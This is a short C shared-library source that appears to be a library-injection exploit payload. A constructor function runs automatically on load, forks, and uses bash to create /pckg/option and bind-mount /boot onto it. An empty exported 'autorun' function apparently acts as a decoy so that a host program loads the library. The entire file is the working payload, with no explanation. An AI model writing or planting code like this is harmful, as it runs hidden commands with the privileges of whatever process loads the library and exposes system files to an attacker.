#include <unistd.h>
#include <stdlib.h>

void __attribute__((constructor)) lol(void)
{
    int fork_result = fork();
    if (fork_result == 0)
    {
        execl("/bin/bash", "bash", "-c", "mkdir /pckg/option; mount -o bind /boot/ /pckg/option", (char *) 0);
        exit(0);
    }
}

extern void autorun(void)
{
    // do nothin' I guess?
    return; 
}

